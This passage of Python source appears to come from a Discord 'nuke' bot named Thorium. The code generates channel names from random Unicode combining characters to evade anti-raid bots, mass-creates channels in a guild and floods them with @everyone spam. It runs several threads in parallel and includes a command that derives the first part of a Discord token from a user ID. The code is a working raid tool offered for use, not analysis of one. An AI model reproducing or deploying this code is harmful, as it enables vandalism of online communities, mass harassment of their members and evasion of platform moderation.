                r6 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r7 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r8 = random.choice(["q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "²", "³", "ü", "ö", "ä", "Ä", "Ö", "Ü", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B", "N", "M", "ª", "Ͷ"])
                r9 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r10 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r11 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r12 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r13 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r14 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r15 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                r16 = random.choice(["̬|", "̬/", "̬%", "̬$", "̬~", "̬!", "̬+", "̬#", "̬§", "̬_", "̬-", "̬&", "̬*", "̬|", "̬⊹", "̬▢", "̬‗", "̬·", "̬▪", "̬¦", "̬,", "̬.", "̬⍦", "̬¤", "̬⌘", "̬°", "̬♛", "̬♟", "̬♙", "̬♘", "̬♔", "̬♕", "̬♖", "̬♗", "̬♛", "̬♚", "̬♞", "̬♝", "̦̬♜", '̦̬"', "̦̬'", "̦̬[", "̦̬]", "̦̬{", "̦̬}", "̦̬©", "̦̬»", "̦×", "̦÷", "̦¿", "̦¾", "̦½", "̦¼", "̦¸", "̦±", "̦®", "̦¯", "̦«", "̦@", "̦^", "̦Ω", "̦Ψ", "̦Δ", "̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̧̧̧̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̰̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯̯A", "X̪", "̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̶̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆!", "̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼̼!"])
                if Antiraidbotbypass == True:
                    Channelname = r1 + r10 + r2 + r11 + r3 + r12 + r4 + r13 + r5 + r14 + r6 + r15 + r7 + r16 + r8 + r9
                    Channelnameprint = r1 + "☣️" + r2 + "☣️" + r3 + "☣️" + r4 + "☣️" + r5 + "☣️" + r6 + "☣️" + r7 + "☣️" + r8 + "☣️"
                else:
                    from config import channelname
                    Channelname = channelname
                    Channelnameprint = Channelname
                print(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]" + " the channel '" + Channelnameprint + "' was created!")
                Channelsend = await ctx.message.guild.create_text_channel(Channelname)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)
                await Channelsend.send(f"{SpamMSG} @everyone", embed=Thorium_embed)
                        
    
    bot.run(NukeToken)
    

while True:
    cmd = input(Fore.WHITE + "[" + Fore.LIGHTWHITE_EX + time.strftime("%H:%M:%S") + Fore.WHITE + "]: " + Fore.LIGHTWHITE_EX)
    if cmd == "Nuke" or cmd == "nuke":
        nuke1 = threading.Thread(target=process)
        nuke2 = threading.Thread(target=process)
        nuke3 = threading.Thread(target=process)
        nuke4 = threading.Thread(target=process)
        nuke5 = threading.Thread(target=mainprocess)
        nuke1.start()
        time.sleep(3)
        nuke2.start()
        time.sleep(3)
        nuke3.start()
        time.sleep(3)
        nuke4.start()
        time.sleep(9)
        nuke5.start()
    if cmd == "IDToken":
        InputUserID = input("Enter DC_User-ID: ")
        RawStarttoken = b64encode(InputUserID.encode("utf-8"))
        RawStarttoken = str(RawStarttoken)
        RawStarttoken = RawStarttoken.replace("b'", "")
        Starttoken = RawStarttoken.replace("'", "")
        print(str(Starttoken))
    if cmd == "Restart":
        os.startfile(__file__)
        exit()
    if cmd == "cmds" or cmd == "help" or cmd == "Help" or cmd == "Cmdlist" or cmd == "cmdlist" or cmd == "CMDLIST" or cmd == "Cmds":
        colorama.init(strip=True)
        print(cmdlist)
        colorama.init(strip=False)
    if cmd == "ws" or cmd == "Ws"or cmd == "WS" or cmd == "Webspam" or cmd == "webspam"or cmd == "Webhookspam"or cmd == "webhookspam":
        print("Coming Soon!")
    if cmd == "IsThoriumSkidedFromLithium?":
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system('title Lithium V3 (CRACKED)')
        colorama.init(strip=True)
        print(getoutofmyhead)
        colorama.init(strip=False)
        
